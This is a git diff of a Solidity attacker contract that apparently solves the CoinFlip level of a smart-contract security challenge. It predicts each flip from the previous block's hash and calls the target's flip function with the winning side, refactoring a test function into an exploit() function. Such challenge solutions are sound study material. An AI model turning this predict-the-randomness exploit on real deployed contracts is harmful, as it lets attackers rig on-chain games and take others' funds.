@@ -1,27 +1,37 @@
-//SPDX-License-Identifier: MIT
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 import "../src/level03.sol";
-import "hardhat/console.sol";
-
 
 contract Attacker
 {
-    CoinFlip level03 = CoinFlip(0xed9b4fAFbe3aB64938f18C656Cd44469daDD8139);
+    uint256 lastHash;
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
-    function test() external
+    CoinFlip level;
+    constructor(address _level)
     {
-        uint256 blockValue = uint256(blockhash(block.number - 1));
-        uint256 coinFlip = blockValue / FACTOR;
-        bool side = coinFlip == 1 ? true : false;
-        
-        console.log("Consecutive Wins Before: ", level03.consecutiveWins());
-        if (side) {
-            level03.flip(true); 
-        } else {
-            level03.flip(false);
-        }
-        console.log("Consecutive Wins After: ", level03.consecutiveWins());
+        level = CoinFlip(_level);
     }
+
+    function exploit() external 
+    {
+            uint256 blockValue = uint256(blockhash(block.number - 1));
+            if (lastHash == blockValue) {
+            revert();
+            }
+
+            lastHash = blockValue;
+            uint256 coinFlip = blockValue / FACTOR;
+            bool side = coinFlip == 1 ? true : false;
+
+            if (side == true)
+            {
+                level.flip(true);
+            }
+            else
+            {
+                level.flip(false);
+            }
+        }   
 }
